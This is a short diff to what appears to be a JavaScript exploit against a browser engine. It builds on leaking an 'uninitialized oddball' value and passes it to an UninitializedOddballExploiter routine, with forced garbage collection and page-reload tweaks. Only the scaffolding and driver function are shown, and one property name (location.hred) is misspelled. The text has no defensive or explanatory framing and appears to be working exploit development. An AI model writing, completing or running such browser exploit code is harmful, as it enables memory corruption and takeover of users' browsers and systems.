@@ -32,6 +32,7 @@ class Helpers {
 
         this.mark_sweep_gc();
         this.mark_sweep_gc();
+        this.mark_sweep_gc();
     }
 
     pair_i32_to_f64(p1, p2) {
@@ -634,15 +635,15 @@ function leak_uninitialized_oddball() {
 function main() {
     var glob_uninitialized_oddball = leak_uninitialized_oddball();
     // %DebugPrint(glob_uninitialized_oddball);
-    alert(typeof(glob_uninitialized_oddball));
+    
     if(typeof(glob_uninitialized_oddball) != "undefined"){
         // alert(typeof(glob_uninitialized_oddball));
-        location.hred = "test12.html"
+        location.hred = "test14.html"
         window.location.reload();
         // console.log("1");
         // window.location.reload();
     }
-    
+    alert(typeof(glob_uninitialized_oddball));
     UninitializedOddballExploiter(glob_uninitialized_oddball);
 }
 
